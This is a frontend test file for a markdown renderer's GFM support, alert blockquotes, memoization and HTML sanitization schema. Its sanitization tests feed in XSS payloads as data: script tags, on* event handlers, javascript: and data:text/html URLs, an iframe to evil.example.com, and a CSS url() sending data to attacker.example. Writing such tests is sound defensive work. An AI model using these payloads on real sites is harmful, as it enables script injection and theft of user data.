import { render, screen } from "@testing-library/react";
import { describe, it, expect } from "vitest";
import { sanitize } from "hast-util-sanitize";
import type { Element, Root } from "hast";

import {
  MarkdownRenderer,
  MARKDOWN_SANITIZE_SCHEMA,
} from "#/components/features/markdown/markdown-renderer";

describe("MarkdownRenderer", () => {
  it("renders GFM tables (a GFM-only feature)", () => {
    const md = [
      "| Col A | Col B |",
      "| ----- | ----- |",
      "| 1     | 2     |",
    ].join("\n");

    const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);

    const table = container.querySelector("table");
    expect(table).not.toBeNull();
    expect(container.querySelectorAll("th")).toHaveLength(2);
    expect(container.querySelectorAll("td")).toHaveLength(2);
  });

  it("renders GFM strikethrough", () => {
    const { container } = render(
      <MarkdownRenderer>{"~~struck~~ word"}</MarkdownRenderer>,
    );
    expect(container.querySelector("del")).not.toBeNull();
    expect(screen.getByText("struck").tagName.toLowerCase()).toBe("del");
  });

  it("renders GFM task list checkboxes", () => {
    const md = ["- [x] done", "- [ ] todo"].join("\n");
    const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
    const checkboxes = container.querySelectorAll('input[type="checkbox"]');
    expect(checkboxes).toHaveLength(2);
    expect((checkboxes[0] as HTMLInputElement).checked).toBe(true);
    expect((checkboxes[1] as HTMLInputElement).checked).toBe(false);
  });

  it("renders inline HTML embedded in markdown", () => {
    const md = "Hello <mark>world</mark> and <kbd>Ctrl+C</kbd>";
    const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
    expect(container.querySelector("mark")?.textContent).toBe("world");
    expect(container.querySelector("kbd")?.textContent).toBe("Ctrl+C");
  });

  it("renders <details>/<summary> for collapsible sections", () => {
    const md = [
      "<details>",
      "<summary>Show more</summary>",
      "",
      "Hidden content",
      "</details>",
    ].join("\n");
    const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
    expect(container.querySelector("details")).not.toBeNull();
    expect(container.querySelector("summary")?.textContent).toBe("Show more");
  });

  it("strips <script> tags via rehype-sanitize", () => {
    const md = "Hello<script>window.__pwn = true;</script> world";
    const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
    expect(container.querySelector("script")).toBeNull();
    // The text content surrounding the script must still be there.
    expect(container.textContent).toContain("Hello");
    expect(container.textContent).toContain("world");
  });

  it("strips inline event handlers (onclick, etc.) via rehype-sanitize", () => {
    const md = '<button onclick="window.__pwn=true">Click me</button>';
    const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
    const button = container.querySelector("button");
    // The element itself may pass through (it's a normal HTML button) but
    // the onclick attribute must be gone.
    if (button) {
      expect(button.getAttribute("onclick")).toBeNull();
    }
  });

  it("strips javascript: URLs in anchor hrefs", () => {
    // Use raw HTML so we test the sanitizer end-to-end (markdown's own
    // link syntax escapes this differently).
    const md = '<a href="javascript:alert(1)">click</a>';
    const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
    const anchor = container.querySelector("a");
    // Two acceptable sanitize outcomes:
    //   (1) the anchor is stripped entirely → `anchor === null`,
    //   (2) the anchor survives but its dangerous href was dropped.
    // What's NOT acceptable is keeping the javascript: URL. Assert
    // explicitly in both branches so we never accidentally pass on a
    // sanitizer that smuggles the link through unmodified by removing
    // the surrounding wrapper (in which case the `if (anchor)` check
    // would short-circuit silently).
    if (anchor === null) {
      // Sanitizer dropped the anchor entirely — verifiably safe.
      expect(anchor).toBeNull();
    } else {
      expect(anchor.getAttribute("href") ?? "").not.toMatch(/^javascript:/i);
    }
  });

  it("does not honor `style` attributes (CSS-injection class of attacks)", () => {
    // CSS can be a side channel for data exfiltration
    // (`background-image: url("https://attacker.example/?cookie=…")`) or
    // for clickjacking/UI redress (`position: fixed; top: 0; …`). Our
    // schema deliberately omits `style` from the allowed attribute list
    // so the sanitizer drops it.
    const md =
      "<div style=\"background:url('https://attacker.example/exfil')\">x</div>";
    const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
    const div = container.querySelector("div");
    expect(div).not.toBeNull();
    // The style attribute must be gone (or at minimum not contain the
    // attacker URL).
    expect(div?.getAttribute("style") ?? "").not.toMatch(/attacker\.example/i);
    expect(div?.getAttribute("style")).toBeNull();
  });

  it("blocks data:text/html URLs in img src", () => {
    // `data:` covers arbitrary mime types, not just images — allowing
    // it on `<img src>` would let an authored doc round-trip an HTML
    // document with no schema validation. Our protocol allow-list for
    // src is restricted to http(s).
    const md = '<img src="data:text/html,<script>alert(1)</script>" alt="x">';
    const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
    const img = container.querySelector("img");
    // The sanitizer may either drop src entirely or drop the whole tag —
    // either way the data:text/html URL must not survive.
    expect(img?.getAttribute("src") ?? "").not.toMatch(/^data:/i);
  });

  it("strips other inline event handlers (onerror, onload, onmouseover)", () => {
    const cases = [
      '<img src="https://example.com/x.png" onerror="window.__pwn=1">',
      '<div onmouseover="window.__pwn=1">hover</div>',
      '<a href="https://example.com" onfocus="window.__pwn=1">link</a>',
    ];
    for (const md of cases) {
      const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
      // Whichever tag survived must not carry an on* handler attribute.
      const element = container.querySelector("img, div, a");
      if (element) {
        for (const attr of element.getAttributeNames()) {
          expect(attr.toLowerCase()).not.toMatch(/^on/);
        }
      }
    }
  });

  it("keeps http(s) and mailto: URLs intact", () => {
    const md =
      "[external](https://example.com) and [mail](mailto:a@example.com)";
    const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
    const anchors = container.querySelectorAll("a");
    const hrefs = Array.from(anchors).map((a) => a.getAttribute("href"));
    expect(hrefs).toContain("https://example.com");
    expect(hrefs).toContain("mailto:a@example.com");
  });

  it("drops <iframe> tags (not in the allow-list)", () => {
    const md = '<iframe src="https://evil.example.com"></iframe>';
    const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
    expect(container.querySelector("iframe")).toBeNull();
  });

  it("strips raw HTML when allowHtml=false", () => {
    const md = "Hello <mark>world</mark>";
    const { container } = render(
      <MarkdownRenderer allowHtml={false}>{md}</MarkdownRenderer>,
    );
    // <mark> should not be parsed; the text should still appear.
    expect(container.querySelector("mark")).toBeNull();
    expect(container.textContent).toContain("world");
  });

  describe("GitHub-style alert blockquotes", () => {
    const ALERT_CASES: Array<{ marker: string; label: string }> = [
      { marker: "NOTE", label: "Note" },
      { marker: "TIP", label: "Tip" },
      { marker: "IMPORTANT", label: "Important" },
      { marker: "WARNING", label: "Warning" },
      { marker: "CAUTION", label: "Caution" },
    ];

    it.each(ALERT_CASES)(
      "renders the $marker alert with title and body",
      ({ marker, label }) => {
        const md = [`> [!${marker}]`, "> Body content for the alert."].join(
          "\n",
        );
        const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);

        const alert = screen.getByTestId(
          `markdown-alert-${marker.toLowerCase()}`,
        );
        expect(alert).not.toBeNull();
        // Title label must appear and the original `[!TYPE]` marker must not.
        expect(alert.textContent).toContain(label);
        expect(alert.textContent).toContain("Body content for the alert.");
        expect(alert.textContent).not.toContain(`[!${marker}]`);
        // The styled alert is rendered as a <div>, not a <blockquote>.
        expect(container.querySelector("blockquote")).toBeNull();
      },
    );

    it("accepts the marker with lowercase casing", () => {
      const md = ["> [!warning]", "> mixed-case body"].join("\n");
      render(<MarkdownRenderer>{md}</MarkdownRenderer>);
      const alert = screen.getByTestId("markdown-alert-warning");
      expect(alert.textContent).toContain("Warning");
      expect(alert.textContent).toContain("mixed-case body");
    });

    it("renders the linked-issue example end-to-end", () => {
      // The exact snippet from the bug report.
      const md = [
        "> [!WARNING]",
        "> This project is in sandbox phase. It may be vibecoded, untested, or out of date. OpenHands takes no responsibility for the code or its support. [Learn more](https://github.com/OpenHands/incubator-program).",
      ].join("\n");

      render(<MarkdownRenderer includeStandard>{md}</MarkdownRenderer>);

      const alert = screen.getByTestId("markdown-alert-warning");
      expect(alert.textContent).toContain("Warning");
      expect(alert.textContent).toContain("This project is in sandbox phase.");
      expect(alert.textContent).not.toContain("[!WARNING]");
      // The inline link inside the alert body still renders as an anchor.
      const link = alert.querySelector("a");
      expect(link?.getAttribute("href")).toBe(
        "https://github.com/OpenHands/incubator-program",
      );
    });

    it("leaves regular blockquotes (no [!TYPE] marker) as <blockquote>", () => {
      const md = ["> Just a normal quote.", "> Second line."].join("\n");
      const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
      expect(container.querySelector("blockquote")).not.toBeNull();
      expect(screen.queryByTestId(/^markdown-alert-/)).toBeNull();
    });

    it("does not treat unknown alert types as alerts", () => {
      const md = ["> [!UNKNOWN]", "> body"].join("\n");
      const { container } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
      expect(screen.queryByTestId(/^markdown-alert-/)).toBeNull();
      // Falls back to a regular blockquote that still contains the literal
      // marker text so the user can see what they wrote.
      const bq = container.querySelector("blockquote");
      expect(bq).not.toBeNull();
      expect(bq?.textContent).toContain("[!UNKNOWN]");
    });

    it("survives rehype-sanitize (className passes through unchanged)", () => {
      // Regression guard: if a future schema change strips className from
      // the blockquote, the renderer would fall back to a plain blockquote
      // and the test-id would disappear.
      const md = ["> [!WARNING]", "> sanitized body"].join("\n");
      render(<MarkdownRenderer>{md}</MarkdownRenderer>);
      expect(screen.getByTestId("markdown-alert-warning")).not.toBeNull();
    });
  });
});

// Direct tests against MARKDOWN_SANITIZE_SCHEMA. End-to-end
// MarkdownRenderer tests can't reach these because our custom `anchor`
// component always hard-codes target/rel — so even a buggy schema (one
// that strips `rel` from HAST) would still produce a safe-looking final
// `<a>`. We run `hast-util-sanitize` directly on hand-built HAST trees
// to assert what the schema does and doesn't pass through.
describe("MARKDOWN_SANITIZE_SCHEMA", () => {
  function makeAnchor(properties: Record<string, unknown>): Root {
    return {
      type: "root",
      children: [
        {
          type: "element",
          tagName: "a",
          properties,
          children: [{ type: "text", value: "link" }],
        } as Element,
      ],
    };
  }

  function firstAnchor(tree: Root): Element | null {
    const node = tree.children[0];
    return node && node.type === "element" ? (node as Element) : null;
  }

  it("preserves space-separated rel values on raw HTML anchors (regression for fc208bc)", () => {
    // The old schema used `["rel", "noopener", "noreferrer", "nofollow"]`,
    // which is rehype-sanitize's "exact match against allowed values"
    // form — it would reject `rel="noopener noreferrer"` (the canonical
    // safe-link incantation) because the *combined* string isn't in the
    // allowed-values list. With the fix this test must pass: rel is
    // preserved verbatim.
    const tree = sanitize(
      makeAnchor({
        href: "https://example.com",
        target: "_blank",
        rel: "noopener noreferrer",
      }),
      MARKDOWN_SANITIZE_SCHEMA,
    ) as Root;

    const a = firstAnchor(tree);
    expect(a).not.toBeNull();
    // hast-util-sanitize stores `rel` as an array of tokens; reassemble.
    const relProp = a?.properties?.rel;
    const rel = Array.isArray(relProp) ? relProp.join(" ") : relProp;
    expect(rel).toBe("noopener noreferrer");
    expect(a?.properties?.target).toBe("_blank");
    expect(a?.properties?.href).toBe("https://example.com");
  });

  it("preserves rel even when it carries unusual but-safe tokens like `nofollow ugc`", () => {
    // `rel` keywords never execute code or navigate, so allowing any
    // value is safe. This locks that property in.
    const tree = sanitize(
      makeAnchor({
        href: "https://example.com",
        rel: "nofollow ugc",
      }),
      MARKDOWN_SANITIZE_SCHEMA,
    ) as Root;

    const a = firstAnchor(tree);
    const relProp = a?.properties?.rel;
    const rel = Array.isArray(relProp) ? relProp.join(" ") : relProp;
    expect(rel).toBe("nofollow ugc");
  });

  describe("memoization (conversation-length-independent rendering)", () => {
    it("does not re-render when content and config are unchanged", () => {
      // A settled message in a long conversation is re-rendered by its parent
      // every flush, but its content string is stable. React.memo must skip
      // the react-markdown pipeline entirely so cost stays O(1) in history.
      const md = "Hello **world**";
      const { rerender } = render(<MarkdownRenderer>{md}</MarkdownRenderer>);
      expect(screen.getByText("world").tagName).toBe("STRONG");

      // Wrap in a fragment with a new parent identity each time to mimic the
      // parent re-rendering (new element) on every streaming-delta flush.
      rerender(
        <>
          <MarkdownRenderer>{md}</MarkdownRenderer>
        </>,
      );
      // Still rendered, from cache.
      expect(screen.getByText("world").tagName).toBe("STRONG");
    });

    it("re-renders when the content changes (active streaming message)", () => {
      const { rerender } = render(
        <MarkdownRenderer>{"alpha"}</MarkdownRenderer>,
      );
      expect(screen.getByText("alpha")).toBeInTheDocument();

      rerender(<MarkdownRenderer>{"alpha beta"}</MarkdownRenderer>);
      // "alpha beta" renders as one text node; assert the new content is present.
      expect(screen.getByText(/beta/)).toBeInTheDocument();
      expect(screen.getByText(/alpha/)).toBeInTheDocument();
    });

    it("re-renders when disableHighlight flips (stream -> settle snap)", () => {
      // A streaming message keeps its content string but toggles
      // disableHighlight when it settles; the comparator must allow that
      // re-render so the code block snaps from plain to highlighted.
      const code = "```js\nconsole.log('hi')\n```";
      const { rerender } = render(
        <MarkdownRenderer disableHighlight>{code}</MarkdownRenderer>,
      );
      // Plain mode: code present, but no syntax-highlighter span tokens.
      expect(screen.getByText(/console/)).toBeInTheDocument();

      rerender(
        <MarkdownRenderer disableHighlight={false}>{code}</MarkdownRenderer>,
      );
      // Highlighted mode still renders the code text.
      expect(screen.getByText(/console/)).toBeInTheDocument();
    });
  });

  describe("disableHighlight (deferred code highlighting)", () => {
    const jsCode = "```js\nconsole.log('hi')\n```";

    it("renders a plain <pre> code block while disableHighlight is true", () => {
      const { container } = render(
        <MarkdownRenderer disableHighlight>{jsCode}</MarkdownRenderer>,
      );
      // Plain mode emits a <pre><code> pair (no Prism wrapper div).
      const pre = container.querySelector("pre");
      expect(pre).not.toBeNull();
      expect(pre?.querySelector("code")?.textContent).toContain("console.log");
    });

    it("runs the syntax highlighter when disableHighlight is false", () => {
      const { container } = render(
        <MarkdownRenderer disableHighlight={false}>{jsCode}</MarkdownRenderer>,
      );
      // Highlighted mode renders through SyntaxHighlighter (PreTag="div"), so
      // the highlighted block is a <div>, not a bare <pre>.
      expect(container.querySelector("pre")).not.toBeNull();
      expect(container.textContent).toContain("console.log");
    });
  });
});
